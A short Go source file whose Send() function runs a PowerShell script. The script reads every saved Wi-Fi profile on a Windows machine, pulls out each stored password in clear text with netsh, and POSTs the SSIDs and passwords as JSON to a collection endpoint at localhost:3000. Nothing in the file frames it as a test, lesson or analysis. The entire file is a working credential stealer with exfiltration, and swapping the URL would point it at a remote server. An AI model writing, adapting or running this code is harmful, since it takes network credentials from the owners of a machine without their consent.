package client

import (
	"os/exec"
)

func Send() {
	exec.Command("powershell", "-Command", `
		$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() };
		$wifiProfiles = @();
		foreach ($profile in $profiles) {
			$profileDetails = netsh wlan show profile name="$profile" key=clear;
			$passwordMatch = $profileDetails | Select-String "Key Content";
			if ($passwordMatch) {
				$password = $passwordMatch.ToString().Split(":")[1].Trim();
			} else {
				$password = "No password found";
			}
			$wifiProfiles += [PSCustomObject]@{ SSID = $profile; Password = $password }
		};
		$json = $wifiProfiles | ConvertTo-Json;
		Invoke-RestMethod -Uri "http://localhost:3000/api/input" -Method Post -Body $json -ContentType "application/json";	
	`).Run()
}
